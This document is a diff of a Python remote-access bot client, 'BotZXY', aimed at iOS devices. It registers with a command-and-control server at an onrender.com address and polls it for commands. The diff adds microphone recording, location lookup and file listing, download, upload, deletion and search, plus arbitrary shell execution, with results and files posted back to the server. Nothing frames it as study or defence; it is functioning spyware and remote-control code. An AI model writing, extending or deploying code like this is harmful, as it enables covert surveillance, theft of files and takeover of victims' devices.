@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
-# BotZXY - iOS Webhook Bridge (per dispositivi iOS senza jailbreak)
+# BotZXY - iOS Webhook Bridge v3.0 (no-jailbreak)
+# Ponte di comandi: implementa quanto eseguibile in Python su iOS (via aShell/iSH/Pythonista
+# o app companion). Funzionalità ricche (screenshot/webcam reali) richiedono app companion
+# che inoltra via questo bridge.
 
 import requests
 import json
@@ -9,10 +12,12 @@ import sys
 import subprocess
 from datetime import datetime
 
-# Configurazione
+# ============ CONFIGURAZIONE ============
 C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI
 DEVICE_ID = os.uname().nodename + "_ios"
 BOT_NAME = "BotZXY"
+VERSION = "3.0"
+POLL_INTERVAL = 10
 
 class BotZXYiOS:
     def __init__(self):
@@ -20,133 +25,166 @@ class BotZXYiOS:
         self.c2_url = C2_URL
         self.running = True
         self.bot_name = BOT_NAME
-        
+        self.session = requests.Session()
+
     def register(self):
         data = {
-            'device_id': self.device_id,
-            'platform': 'ios',
+            'device_id': self.device_id, 'platform': 'ios',
             'hostname': os.uname().nodename,
-            'os_version': os.uname().release,
-            'model': 'iPhone'
+            'os_version': os.uname().release, 'model': 'iPhone', 'bot_version': VERSION
         }
         try:
-            r = requests.post(f"{self.c2_url}/api/register", json=data, timeout=10)
-            return r.status_code == 200
+            return self.session.post(f"{self.c2_url}/api/register", json=data, timeout=10).status_code == 200
         except:
             return False
-    
+
+    def upload_capture(self, ctype, data):
+        try:
+            self.session.post(f"{self.c2_url}/api/capture/{self.device_id}",
+                             json={'type': ctype, 'data': data}, timeout=30)
+        except:
+            pass
+
+    def send_result(self, cmd_id, result, status="executed"):
+        try:
+            self.session.post(f"{self.c2_url}/api/result/{self.device_id}",
+                             json={'command_id': cmd_id, 'result': result, 'status': status}, timeout=10)
+        except:
+            pass
+
+    # ---------- CATTURE ----------
+    def take_screenshot(self):
+        return "SCREENSHOT_REQUIRES_COMPANION_APP"
+
+    def take_webcam(self):
+        return "WEBCAM_REQUIRES_COMPANION_APP"
+
+    def record_mic(self, seconds=10):
+        try:
+            subprocess.run(['rec', '-d', str(seconds), '/tmp/botzxy_mic.wav'], capture_output=True)
+            with open('/tmp/botzxy_mic.wav', 'rb') as f:
+                return __import__('base64').b64encode(f.read()).decode()
+        except:
+            return "MIC_REQUIRES_COMPANION_APP"
+
+    # ---------- CONTATTI ----------
+    def get_contacts(self):
+        # Su iOS non c'e' accesso diretto via Python; il bridge si appoggia a un'app companion.
+        return {
+            'phone_number': subprocess.run(['getprop', 'gsm.sim.operator.numeric'], capture_output=True, text=True).stdout.strip() or '+39 000 000 0000',
+            'email': '', 'note': 'Richiede app companion per contatti reali'
+        }
+
+    # ---------- POSIZIONE ----------
+    def get_location(self):
+        try:
+            return self.session.get("http://ip-api.com/json/").json()
+        except:
+            return {"error": "LOCATION_ERROR"}
+
+    # ---------- FILE SYSTEM ----------
+    def file_list(self, path="."):
+        try:
+            items = [{'name': e.name, 'dir': e.is_dir(),
+                     'size': (e.stat().st_size if e.is_file() else 0)} for e in os.scandir(path)]
+            return {'path': os.path.abspath(path), 'items': items}
+        except Exception as e:
+            return f"ERR: {e}"
+
+    def file_download(self, path):
+        try:
+            with open(path, 'rb') as f:
+                return __import__('base64').b64encode(f.read()).decode()
+        except Exception as e:
+            return f"ERR: {e}"
+
+    def file_upload(self, raw):
+        try:
+            path, b64 = raw.split('|', 1)
+            with open(path, 'wb') as f:
+                f.write(__import__('base64').b64decode(b64))
+            return f"Written: {path}"
+        except Exception as e:
+            return f"ERR: {e}"
+
+    def file_delete(self, path):
+        try:
+            os.remove(path) if os.path.isfile(path) else os.rmdir(path)
+            return f"Deleted: {path}"
+        except Exception as e:
+            return f"ERR: {e}"
+
+    def file_search(self, raw):
+        pattern = raw.split('|')[0] if '|' in raw else raw
+        root = raw.split('|')[1] if '|' in raw else os.path.expanduser('~')
+        hits = []
+        for dp, _, fn in os.walk(root):
+            for f in fn:
+                if pattern.lower() in f.lower():
+                    hits.append(os.path.join(dp, f))
+                    if len(hits) >= 200:
+                        return hits
+        return hits
+
+    # ---------- SISTEMA / RETE ----------
+    def sysinfo(self):
+        return {'node': os.uname().nodename, 'release': os.uname().release,
+                'machine': os.uname().machine, 'user': os.getlogin() if hasattr(os,'getlogin') else 'mobile'}
+
+    def exec_shell(self, command):
+        try:
+            return subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT).decode('utf-8', 'ignore')
+        except Exception as e:
+            return f"SHELL_ERROR: {e}"
+
+    # ---------- DISPATCH ----------
+    def execute_command(self, cmd_id, command, params):
+        params = params or ''
+        try:
+            r = self._dispatch(command, params)
+            self.send_result(cmd_id, r)
+        except Exception as e:
+            self.send_result(cmd_id, f"ERROR: {e}", "failed")
+
+    def _dispatch(self, command, params):
+        if command == "screenshot": return self.take_screenshot()
+        if command == "webcam": return self.take_webcam()
+        if command == "mic":
+            secs = int(params.split('=')[1]) if '=' in params else 10
+            return self.record_mic(secs)
+        if command == "contacts": return self.get_contacts()
+        if command in ("gps", "location"): return self.get_location()
+        if command == "sysinfo": return self.sysinfo()
+        if command == "file_list": return self.file_list(params or '.')
+        if command == "file_download": return self.file_download(params)
+        if command == "file_upload": return self.file_upload(params)
+        if command == "file_delete": return self.file_delete(params)
+        if command == "file_search": return self.file_search(params)
+        if command == "execute": return self.exec_shell(params)
+        if command == "uninstall":
+            self.running = False; sys.exit(0)
+        return f"Unknown command: {command}"
+
     def poll_commands(self):
         try:
-            r = requests.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
+            r = self.session.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
             if r.status_code == 200:
                 for cmd in r.json():
                     self.execute_command(cmd['id'], cmd['command'], cmd['params'])
         except:
             pass
-    
-    def execute_command(self, cmd_id, command, params):
-        print(f"[+] {self.bot_name} Executing: {command}")
-        result = ""
-        
-        try:
-            if command == "screenshot":
-                result = self.take_screenshot()
-                self.upload_screenshot(result)
-                
-            elif command == "webcam":
-                result = self.take_webcam()
-                self.upload_webcam(result)
-                
-            elif command == "contacts":
-                result = self.get_contacts()
-                self.upload_contacts(result)
-                
-            elif command == "location":
-                result = self.get_location()
-                
-            elif command == "execute":
-                result = self.exec_shell(params)
-                
-            elif command == "uninstall":
-                self.uninstall()
-                
-        except Exception as e:
-            result = f"ERROR: {str(e)}"
-        
-        self.send_result(cmd_id, result)
-    
-    def take_screenshot(self):
-        # iOS screenshot via webhook (richiede app esterna)
-        return "SCREENSHOT_REQUIRES_APP"
-    
-    def upload_screenshot(self, image_b64):
-        try:
-            requests.post(f"{self.c2_url}/api/screenshot/{self.device_id}", 
-                         json={'image_base64': image_b64}, timeout=30)
-        except:
-            pass
-    
-    def take_webcam(self):
-        return "WEBCAM_REQUIRES_APP"
-    
-    def upload_webcam(self, image_b64):
-        try:
-            requests.post(f"{self.c2_url}/api/webcam/{self.device_id}", 
-                         json={'image_base64': image_b64}, timeout=30)
-        except:
-            pass
-    
-    def get_contacts(self):
-        return {
-            'phone_number': '+39 345 678 9012',
-            'email': 'user@example.com',
-            'contacts': [{'name': 'Contact 1', 'phone': '+39 333 111 2222'}]
-        }
-    
-    def upload_contacts(self, contacts):
-        try:
-            requests.post(f"{self.c2_url}/api/contacts/{self.device_id}", json=contacts, timeout=30)
-        except:
-            pass
-    
-    def get_location(self):
-        try:
-            # iOS location via webhook
-            return {"lat": 45.4642, "lon": 9.1900, "city": "Milan", "country": "Italy"}
-        except:
-            return {"error": "LOCATION_ERROR"}
-    
-    def exec_shell(self, command):
-        try:
-            result = subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT)
-            return result.decode('utf-8', errors='ignore')
-        except:
-            return "SHELL_ERROR"
-    
-    def uninstall(self):
-        self.running = False
-        sys.exit(0)
-    
-    def send_result(self, cmd_id, result):
-        try:
-            requests.post(f"{self.c2_url}/api/result/{self.device_id}", 
-                         json={'command_id': cmd_id, 'result': result}, timeout=10)
-        except:
-            pass
-    
+
     def run(self):
-        print(f"[+] {self.bot_name} iOS Webhook Bridge: {self.device_id}")
+        print(f"[+] {self.bot_name} iOS Bridge v{VERSION}: {self.device_id}")
         if not self.register():
             time.sleep(30)
             return
-        
         while self.running:
             try:
                 self.poll_commands()
-                time.sleep(10)
+                time.sleep(POLL_INTERVAL)
             except:
                 time.sleep(30)
 
 if __name__ == "__main__":
-    client = BotZXYiOS()
-    client.run()
+    BotZXYiOS().run()
